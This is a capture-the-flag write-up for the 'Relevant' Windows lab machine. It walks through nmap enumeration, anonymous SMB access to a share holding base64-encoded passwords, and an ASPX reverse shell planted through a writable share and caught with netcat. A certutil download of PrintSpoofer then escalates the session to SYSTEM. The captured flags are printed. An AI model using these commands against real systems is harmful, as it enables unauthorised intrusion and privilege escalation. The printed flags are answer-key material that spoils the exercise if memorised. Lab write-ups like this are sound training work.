# CTF Writeup: Relevant

---

## Reconnaissance 

Mapped 10.10.159.123 in /etc/hosts to relevant.thm domain.

```
sudo echo "10.10.159.123  relevant.thm" | sudo tee -a /etc/hosts
```
Enumerated Services + Details about the Services
```
nmap -n -Pn -sS -T4 -p- relevant.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 03:06 CDT
Nmap scan report for relevant.thm (10.10.159.123)
Host is up (0.055s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 161.86 seconds
```
Revealed 7 open TCP Ports. An Service-Version Scan reveals more about the services running:

```
nmap -n -Pn -sSCV -p 80,139,445,3389,49663,49666,49667 relevant.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 04:39 CDT
Nmap scan report for relevant.thm (10.10.247.193)
Host is up (0.044s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2025-09-04T09:37:36
|_Not valid after:  2026-03-06T09:37:36
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-09-05T09:40:40+00:00
|_ssl-date: 2025-09-05T09:41:20+00:00; 0s from scanner time.
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-09-05T09:40:41
|_  start_date: 2025-09-05T09:37:36
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-05T02:40:45-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.53 seconds
```

Started with enumerating the IIS webpage HTTP (80), but couldn't retrieve anything useful.

So I moved on to SMB (445), which prompted me SMB Shares with Anonymous Access.

```
smbclient -L \\\\relevant.thm\\                                 
Password for [WORKGROUP\unkn0wn]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to relevant.thm failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Tried Anonymous Login into "nt4wrksv" share and it worked! Downloaded the passwords.txt file.

```
smbclient \\\\relevant.thm\\nt4wrksv
Password for [WORKGROUP\unkn0wn]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 16:46:04 2020
  ..                                  D        0  Sat Jul 25 16:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020

                7735807 blocks of size 4096. 5141575 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```

```
cat passwords.txt        
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
Looks like there is two base64 encoded strings. Let's decode them.

```
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d         
Bob - !P@$$W0rD!123
```
```
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

Deeper recon also reveals that SMB is affected from a critical CVE.

```
nmap -n -Pn --script vuln -p 139,445 relevant.thm                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 04:45 CDT
Nmap scan report for relevant.thm (10.10.247.193)
Host is up (0.032s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 26.17 seconds
```

Since I'm not able to go login into RDP or ADMIN$ SMB Share with the Credentials, I will
try to checkout the 2. webserver running on port 49663.

I discovered that the "nt4wrksv" SMB Share is viewable under the IIS Web-Server on 49663. The Share is also editable, I tested it by adding a test.txt and viewing it on the webserver.

```
echo "hello" > test.txt                                 
                                                                                               
┌──(unkn0wn㉿unkn0wn)-[~]
└─$ smbclient \\\\10.10.247.193\\nt4wrksv        
Password for [WORKGROUP\unkn0wn]:
Try "help" to get a list of possible commands.
smb: \> put test.txt 
putting file test.txt as \test.txt (0.1 kb/s) (average 0.1 kb/s)
smb: \> ls
  .                                   D        0  Fri Sep  5 05:08:30 2025
  ..                                  D        0  Fri Sep  5 05:08:30 2025
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020
  test.txt                            A        6  Fri Sep  5 05:08:30 2025

                7735807 blocks of size 4096. 5134719 blocks available
```

## Intial Access


So we will utilize an aspx rev-shell and put it in the SMB Share to execute it on the IIS web-server and potentially gain RCE.
Downloaded following shell.aspx:

```
https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx
```
After putting the file in the nt4wrksv SMB Share, I started up a listener on port 1234

```
nc -lvnp 1234
```
and executed the shell on http://relevant.thm:49663/nt4wrksv/shell.aspx and gained RCE.

```
nc -lvnp 1234                         
listening on [any] 1234 ...
connect to [10.21.156.104] from (UNKNOWN) [10.10.247.193] 49881
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```
Retrieved user.txt in C:\Users\Bob\Desktop

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

## Privilege Escalation

The first thing I did is checking for which privileges are open

```
whoami /priv
```
and it prompted us that "SeImpersonatePrivilege" is available. Unfortunately I prepared all the steps utilizing Metasploit, but in the end my msfvenom payload wasn't executable.

```
c:\Temp>shell.exe
shell.exe
The system cannot execute the specified program.
```
So I decided to install PrintSpoofer.exe, which is an tool that allows us to elevate our privileges when the "SeImpersonatePrivilege" is available.

Created a python3 webserver locally.
```
python3 -m http.server 80
```
Navigated into the C:\inetpub\wwwroot\nt4wrksv directory and executed following command to install PrintSpoofer.exe on the target machine.

```
certutil -urlcache -f http://10.21.156.104/PrintSpoofer.exe printspoofer.exe
```

In order to elevate our privileges utilize Printspoofer by Executing following command:

```
printspoofer.exe -i -c cmd
```

Gained RCE as NT AUTHORITY\SYSTEM.

```
c:\inetpub\wwwroot\nt4wrksv>printspoofer.exe -i -c cmd
printspoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Retrieved root.txt flag in C:\Users\Administrator\Desktop

```
THM{1fk5kf469devly1gl320zafgl345pv}
```
